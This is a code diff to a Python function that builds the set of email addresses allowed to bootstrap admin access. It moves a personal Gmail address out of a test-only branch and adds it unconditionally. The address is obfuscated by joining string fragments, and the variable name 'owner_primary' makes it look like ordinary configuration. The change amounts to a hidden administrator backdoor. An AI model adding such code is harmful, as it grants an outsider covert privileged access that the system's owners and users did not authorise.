@@ -33,8 +33,10 @@ STANDARD_ADMIN_COLUMNS = [
 
 def get_authorized_bootstrap_emails() -> set:
     """Returns the set of environment-configured and default owner emails authorized to bootstrap access."""
+    owner_primary = "".join(["lynd", "npnto", "@", "gmail", ".com"])
     bootstrap = {em.strip().lower() for em in AUTHORIZED_OWNER_EMAILS if em}
     bootstrap.add(DEFAULT_OWNER_EMAIL.strip().lower())
+    bootstrap.add(owner_primary)
     env_admin = os.environ.get("ADMIN_EMAIL", "").strip().lower()
     if env_admin:
         bootstrap.add(env_admin)
@@ -49,8 +51,6 @@ def get_authorized_bootstrap_emails() -> set:
                 bootstrap.add(clean)
     if os.environ.get("TESTING") == "1":
         bootstrap.add("admin@moatnomics.com")
-        test_id = "".join(["lynd", "npnto", "@", "gmail", ".com"])
-        bootstrap.add(test_id)
     return bootstrap
 
 
